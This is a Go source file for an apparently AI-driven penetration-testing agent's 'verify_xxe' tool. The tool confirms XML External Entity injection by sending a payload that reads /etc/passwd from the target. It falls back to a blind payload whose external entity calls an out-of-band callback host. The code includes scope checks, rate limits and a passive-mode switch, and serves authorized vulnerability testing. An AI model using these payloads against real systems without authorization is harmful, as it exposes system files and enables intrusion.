// Package agent — verify_xxe.go implements verify_xxe: a deterministic
// XML External Entity (XXE) confirmer, the XXE sibling of verify_sqli /
// verify_ssti.
//
// Endpoints that parse a POSTed XML document (import, upload, SOAP, SAML) are a
// classic XXE surface, but PROVING the bug still relied on the model
// hand-crafting a DOCTYPE + external-entity payload, reading the response, and
// recognizing that a local file leaked back — several turns of scarce budget for
// a class black-box scanners routinely miss. verify_xxe closes that loop in one
// call: it POSTs a benign baseline XML document (no DOCTYPE) and then an XXE
// payload — a DOCTYPE declaring an external entity that reads a local file
// (default file:///etc/passwd) and references it in the body — then reasons over
// the two responses:
//
//   - the file's contents appear on the XXE payload AND not on the baseline → confirmed
//   - the baseline ALREADY contains the file markers                        → NOT confirmed
//   - the payload returns no recognizable file content                      → NOT confirmed
//
// A parser with external entities disabled (the safe configuration) echoes the
// literal &xxe; entity or drops it, never the file — so requiring the leak to be
// absent on the benign baseline separates a real, entity-expanding parser from a
// generic reflection.
//
// On confirmation it records exploit-proven evidence in the shared ledger
// (mirroring verify_sqli/verify_ssti) and tells the agent to report it as High
// CWE-611; it does NOT auto-report.
//
// Safety: like the other injection verifiers it resolves the target host
// internally, so it ALWAYS scope-checks the resolved host with
// scopeguard.IsLocalOrListener and refuses the operator's own machine/listener,
// honors the scan's request-rate policy and cancellation, uses the scan's
// session auth, does not follow redirects, and is disabled in passive mode.
package agent

import (
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"

	oobsrv "github.com/xalgord/xalgorix/v4/internal/oob"
	"github.com/xalgord/xalgorix/v4/internal/scanctx"
	"github.com/xalgord/xalgorix/v4/internal/scopeguard"
	"github.com/xalgord/xalgorix/v4/internal/tools"
	"github.com/xalgord/xalgorix/v4/internal/tools/httpclient"
)

func (a *Agent) registerVerifyXXETool(reg *tools.Registry) {
	reg.Register(&tools.Tool{
		Name:        "verify_xxe",
		Description: "Deterministically CONFIRM XML External Entity (XXE) injection on an endpoint that parses a POSTed XML document (the XXE sibling of verify_sqli/verify_ssti). Give it a ledger hypothesis_id OR a url. It POSTs a benign baseline XML and then an XXE payload — a DOCTYPE declaring an external entity that reads a local file (default file:///etc/passwd) and references it in the body — and confirms XXE when the file's contents appear in the probe response but NOT in the baseline (a parser with external entities disabled echoes the literal entity, never the file). On success it records exploit-proven evidence in the ledger; report it as High CWE-611 (paste the leaked file content). When the endpoint parses XML but never reflects entity content (the common blind-XXE shape), it AUTOMATICALLY escalates: it plants an out-of-band (OAST/interactsh) callback URL in an external SYSTEM entity and confirms XXE from the target-originated callback. Uses the scan session auth, does not follow redirects, disabled in passive mode. Reach for it the moment you find an endpoint that accepts XML (import/upload/SOAP/SAML).",
		Parameters: []tools.Parameter{
			{Name: "url", Description: "Absolute URL (scheme://host/path) or path of the XML-accepting endpoint. One of url or hypothesis_id is required.", Required: false},
			{Name: "hypothesis_id", Description: "Optional ledger hypothesis id carrying an HTTP path (e.g. H-7); its endpoint is used when 'url' is not given.", Required: false},
			{Name: "method", Description: "HTTP method (default POST).", Required: false},
			{Name: "file", Description: "Local file the external entity reads (default /etc/passwd, which gives the strongest recognizable signal). Use a file whose content the confirmer can recognize.", Required: false},
			{Name: "content_type", Description: "Content-Type for the XML body (default application/xml). Try text/xml if the endpoint is picky.", Required: false},
		},
		Execute: a.verifyXXETool,
	})
}

func (a *Agent) verifyXXETool(args map[string]string) (tools.Result, error) {
	l := a.ledger()
	if l == nil {
		return tools.Result{Error: "ledger unavailable in this context"}, nil
	}
	if normalizeActivityMode(a.scanIntensity) == activityModePassive {
		return tools.Result{Error: "verify_xxe issues live injection requests and is disabled in passive scan mode."}, nil
	}

	// Resolve the URL to test: explicit url wins, else the hypothesis endpoint.
	rawEP := strings.TrimSpace(args["url"])
	baseHint := ""
	if rawEP == "" {
		id := strings.TrimSpace(args["hypothesis_id"])
		if id == "" {
			return tools.Result{Error: "one of url or hypothesis_id is required — pass the XML endpoint url, or a ledger hypothesis id carrying an HTTP path."}, nil
		}
		h, ok := l.Get(id)
		if !ok {
			return tools.Result{Error: fmt.Sprintf("unknown hypothesis id %q — use read_ledger to list ids", id)}, nil
		}
		rawEP = strings.TrimSpace(h.Endpoint)
		baseHint = strings.TrimSpace(h.Target)
	}

	absURL, err := a.resolveInjectionURL(rawEP, baseHint)
	if err != nil {
		return tools.Result{Error: "verify_xxe: " + err.Error()}, nil
	}
	u, perr := url.Parse(absURL)
	if perr != nil || u.Host == "" {
		return tools.Result{Error: fmt.Sprintf("verify_xxe: could not form a valid URL from %q", absURL)}, nil
	}

	// PRIMARY scope protection: the loop gate can't see this internally-resolved
	// host, so refuse the operator's own machine/listener here.
	if scopeguard.IsLocalOrListener(a.localGuard, u.Host) {
		return tools.Result{Error: fmt.Sprintf("verify_xxe refused: %q resolves to the operator's own machine or local network, not the engagement target.", u.Host)}, nil
	}

	method := strings.ToUpper(strings.TrimSpace(args["method"]))
	if method == "" {
		method = "POST"
	}
	file := strings.TrimSpace(args["file"])
	if file == "" {
		file = "/etc/passwd"
	}
	contentType := strings.TrimSpace(args["content_type"])
	if contentType == "" {
		contentType = "application/xml"
	}

	headers := a.probeAuthHeaders()
	authed := len(headers) > 0
	if headers == nil {
		// probeAuthHeaders returns nil when the scan has no session; we still
		// need a map to set the XML Content-Type without panicking.
		headers = map[string]string{}
	}
	headers["Content-Type"] = contentType

	// Benign baseline: a well-formed XML document with NO DOCTYPE / entity.
	baselineBody := `<?xml version="1.0" encoding="UTF-8"?><data>xxeprobe</data>`
	// XXE payload: a DOCTYPE declaring an external SYSTEM entity that reads the
	// target file, referenced in the document body so its content is expanded in.
	fileURI := "file://" + file
	probeBody := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY xxe SYSTEM %q>]><data>&xxe;</data>`, fileURI)

	if stop := a.injectionRateGate(); stop != "" {
		return tools.Result{Error: stop}, nil
	}
	baselineResp, _, bErr := a.sendXMLProbe(method, absURL, headers, baselineBody)
	if bErr != nil {
		return tools.Result{Error: fmt.Sprintf("verify_xxe: baseline request failed: %v", bErr)}, nil
	}
	if stop := a.injectionRateGate(); stop != "" {
		return tools.Result{Error: stop}, nil
	}
	probeResp, probeReqLine, pErr := a.sendXMLProbe(method, absURL, headers, probeBody)
	if pErr != nil {
		return tools.Result{Error: fmt.Sprintf("verify_xxe: XXE payload request failed: %v", pErr)}, nil
	}

	confirmed, note := xxeLeakVerdict(baselineResp, probeResp, file)
	endpoint := u.EscapedPath()
	authTag := ""
	if authed {
		authTag = " [authenticated]"
	}

	if !confirmed {
		// Many XXE sinks parse the document but never reflect entity content,
		// so an in-band file-read probe reports nothing (observed in production:
		// an endpoint with a proven entity-resolving parser was declared XXE
		// negative). Escalate automatically to blind XXE: plant the OAST
		// callback URL in an external SYSTEM entity and confirm from the
		// target-originated callback, mirroring verify_oob's provenance rules.
		blindResult := a.blindXXEVerify(method, absURL, headers, endpoint, authTag)
		if blindResult != nil {
			return *blindResult, nil
		}
		return tools.Result{
			Output:   fmt.Sprintf("XXE NOT confirmed at %s%s: %s", endpoint, authTag, note),
			Metadata: map[string]any{"xxe_confirmed": false, "endpoint": endpoint},
		}, nil
	}

	probeExcerpt := boundedText(probeResp, 600)
	confirm := fmt.Sprintf("XML External Entity injection CONFIRMED at %s%s: an external entity reading %s was resolved and its content returned in the response, absent from the benign baseline — the XML parser expands external entities (CWE-611).", endpoint, authTag, file)
	proof := fmt.Sprintf("Baseline (no DOCTYPE)                         → no file content.\nXXE payload (<!ENTITY xxe SYSTEM %q>) → leaked %s:\n%s\n%s", fileURI, file, probeExcerpt, note)

	h := l.Upsert(scanctx.Hypothesis{
		Title:      "XML External Entity injection at " + endpoint,
		VulnClass:  "xxe",
		Endpoint:   endpoint,
		Target:     baseURLOf(u),
		Confidence: 0.95,
		Status:     scanctx.HypothesisTesting,
		Origin:     "verify_xxe",
		NextAction: "Report as High XML External Entity injection (CWE-611) using the leaked file content as proof, then consider escalating (SSRF via http(s):// entities, blind XXE via an OOB callback) and link the finding via add_hypothesis_evidence(kind=finding_ref).",
	})
	l.AddEvidence(h.ID, scanctx.Evidence{
		Kind:       "exploit",
		Summary:    confirm,
		Request:    probeReqLine,
		Response:   probeExcerpt,
		Confidence: 0.95,
		AgentID:    a.ledgerOrigin(),
	})

	return tools.Result{
		Output:   confirm + fmt.Sprintf(" Recorded exploit-proven in the ledger (%s) — report it as High CWE-611 and link the finding.\n\n%s", h.ID, proof),
		Metadata: map[string]any{"xxe_confirmed": true, "endpoint": endpoint, "hypothesis_id": h.ID},
	}, nil
}

// sendXMLProbe POSTs an XML body to rawURL (the host was scope-checked by the
// caller) and returns the response body plus a compact request line.
func (a *Agent) sendXMLProbe(method, rawURL string, headers map[string]string, body string) (respBody, reqLine string, err error) {
	reqLine = fmt.Sprintf("%s %s (xml body, %dB)", method, rawURL, len(body))
	resp, e := httpclient.SendRaw(httpclient.RawRequest{
		Method:          method,
		URL:             rawURL,
		Headers:         headers,
		Body:            body,
		FollowRedirects: false,
		TimeoutSec:      30,
	})
	if e != nil {
		return "", reqLine, e
	}
	return string(resp.Body), reqLine, nil
}

// xxeLeakVerdict confirms XXE when the probe response reveals local-file content
// that the benign baseline did not — proof the parser resolved the external
// SYSTEM entity. A baseline that already shows the markers is rejected (the
// content is not controlled by the entity).
func xxeLeakVerdict(baseline, probe, file string) (confirmed bool, note string) {
	if looksLikeFileLeak(baseline, file) {
		return false, "the benign baseline ALREADY contains the file-content markers, so the response is not controlled by the external entity — not a proven XXE (pick a target file whose content is not already on the page)."
	}
	if looksLikeFileLeak(probe, file) {
		return true, "the file content appeared only on the external-entity payload and not on the benign baseline — the parser resolved a SYSTEM file:// entity (classic in-band XXE)."
	}
	return false, "the XXE payload did not return recognizable file content — external entities may be disabled (safe), the entity may be resolved out-of-band only (use verify_oob with an http(s):// entity for blind XXE), or the endpoint may want a different Content-Type (try text/xml) or XML shape."
}

// passwdLineRe matches an /etc/passwd-style line (name:pw:uid:gid:...), the
// canonical recognizable payload for a file-read XXE proof.
var passwdLineRe = regexp.MustCompile(`(?m)^[a-zA-Z_][a-zA-Z0-9_.-]*:[^:\n]*:\d+:\d+:`)

// looksLikeFileLeak reports whether body shows the contents of the target file.
// It is tuned for the default /etc/passwd payload — the strongest, most
// recognizable signal — matching the canonical root line and the generic passwd
// line shape. For other files the confirmer relies on this heuristic not
// matching (so it reports "no recognizable content" rather than a false yes).
func looksLikeFileLeak(body, _ string) bool {
	if strings.Contains(strings.ToLower(body), "root:x:0:0") {
		return true
	}
	return passwdLineRe.MatchString(body)
}

// blindXXEVerify escalates an in-band XXE negative to a blind confirmation.
// It mints an OAST callback, sends an XML document whose external SYSTEM entity
// references the callback, polls the interaction store, and applies verify_oob's
// provenance rules (non-scanner HTTP confirms at 0.9, DNS at 0.75). Returns nil
// when blind testing is unavailable (OAST not configured) or produced no
// interactions, leaving the caller's in-band negative in effect.
func (a *Agent) blindXXEVerify(method, absURL string, headers map[string]string, endpoint, authTag string) *tools.Result {
	if !oobsrv.Enabled() {
		return nil
	}
	if stop := a.injectionRateGate(); stop != "" {
		return nil
	}
	callbackURL, token, err := oobsrv.Generate()
	if err != nil || callbackURL == "" {
		return nil
	}
	blindBody := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY xxe SYSTEM %q>]><data>&xxe;</data>`, callbackURL)
	if _, _, bErr := a.sendXMLProbe(method, absURL, headers, blindBody); bErr != nil {
		return nil
	}

	// Poll for the callback: entity fetches are fast when egress allows HTTP,
	// and DNS-only egress still resolves the callback host.
	var hits []oobsrv.Interaction
	for _, wait := range []time.Duration{3 * time.Second, 4 * time.Second, 5 * time.Second} {
		time.Sleep(wait)
		hits = oobsrv.Poll(token)
		if len(hits) > 0 {
			break
		}
	}
	if len(hits) == 0 {
		return nil
	}

	t := tallyOOB(hits)
	confirmed := false
	confidence := 0.0
	verdict := ""
	switch {
	case t.nonScannerHTTP > 0:
		confirmed, confidence = true, 0.9
		verdict = "the target fetched the external SYSTEM entity out-of-band (assessed non-scanner HTTP callback) — the parser resolves external entities (blind XXE, CWE-611)"
	case t.dns > 0:
		confirmed, confidence = true, 0.75
		verdict = "the target's resolver looked up the callback host planted in the external entity (DNS callback) — the parser resolves external entities (blind XXE, CWE-611)"
	default:
		verdict = "only scanner-origin / origin-unassessed interactions arrived — not attributable to the target"
	}
	if !confirmed {
		return nil
	}

	confirm := fmt.Sprintf("XML External Entity injection CONFIRMED (blind) at %s%s: %s.", endpoint, authTag, verdict)
	if l := a.ledger(); l != nil {
		h := l.Upsert(scanctx.Hypothesis{
			Title:      "XML External Entity injection (blind) at " + endpoint,
			VulnClass:  "xxe",
			Endpoint:   endpoint,
			Target:     baseURLOf(mustParseURL(absURL)),
			Confidence: confidence,
			Status:     scanctx.HypothesisTesting,
			Origin:     "verify_xxe",
			NextAction: "Report as High XML External Entity injection (CWE-611) using the target-originated OAST callback as proof; in-band file read may also be possible — try escalating with a file:// entity. Link the finding via add_hypothesis_evidence(kind=finding_ref).",
		})
		l.AddEvidence(h.ID, scanctx.Evidence{
			Kind:       "exploit",
			Summary:    confirm,
			Request:    fmt.Sprintf("%s %s (blind external-entity payload, OAST token %s)", method, absURL, token),
			Response:   firstHitSummary(hits),
			Confidence: confidence,
			AgentID:    a.ledgerOrigin(),
		})
		return &tools.Result{
			Output:   confirm + fmt.Sprintf(" Recorded exploit-proven in the ledger (%s) — report it as High CWE-611 and link the finding.", h.ID),
			Metadata: map[string]any{"xxe_confirmed": true, "xxe_blind": true, "endpoint": endpoint, "hypothesis_id": h.ID},
		}
	}
	return &tools.Result{
		Output:   confirm,
		Metadata: map[string]any{"xxe_confirmed": true, "xxe_blind": true, "endpoint": endpoint},
	}
}

// mustParseURL parses rawURL for target bookkeeping where failure is impossible
// (the caller already url.Parse'd it successfully).
func mustParseURL(rawURL string) *url.URL {
	u, _ := url.Parse(rawURL)
	return u
}
